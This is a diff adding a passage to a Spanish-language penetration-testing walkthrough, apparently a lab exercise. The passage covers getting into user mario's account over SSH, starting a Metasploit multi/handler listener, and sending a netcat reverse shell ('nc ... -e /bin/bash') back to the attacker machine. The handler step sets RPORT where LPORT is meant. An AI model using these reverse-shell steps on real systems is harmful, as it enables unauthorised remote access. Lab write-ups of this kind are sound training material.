@@ -494,6 +494,30 @@ Nos conectamos a la sesión (ya tendríamos acceso a la primera máquina) y vamo
 sessions -i 1
 ```
 
+**Otra opción de acceder a la sesión en Metasploit y convertirla en Meterpreter**
+
+Si en vez de usar el módulo de Metasploit, usásemos hydra como usamos al principio podemos entrar a la cuenta de mario de forma normal con ssh:
+```bash
+ssh mario@10.10.10.2
+```
+Aquí estaríamos dentro de la shell de mario. Desde aquí podemos pasarle esta shell a Metasploit.
+
+En Metasploit usamos el `multi/handler` y nos ponemos en escucha, mientras que en la shell de mario nos envíamos una shell.
+```
+# Metasploit
+msfconsole
+use /multi/handler
+options
+set LHOST 10.10.10.1   # nuestra máquina atacante Kali
+set RPORT 443   # puerto cualquiera
+run
+
+# En la shell de mario
+nc 10.10.10.1 443 -e /bin/bash
+```
+
+En el multi handler aunque parece que no hay nada tenemos una shell. Podemos escribir comandos ya. Al igual que la shell que obtuvimos con el módulo ssh_login, es una shell de tipo normal, no es una meterpreter. Hay que convertirla. 
+
 ### Trust
 
 Aquí estamos accediendo a una sesión shell normal, no a una Meterpreter. Por tanto usaremos un módulo que nos cambie de shell de a meterpreter:
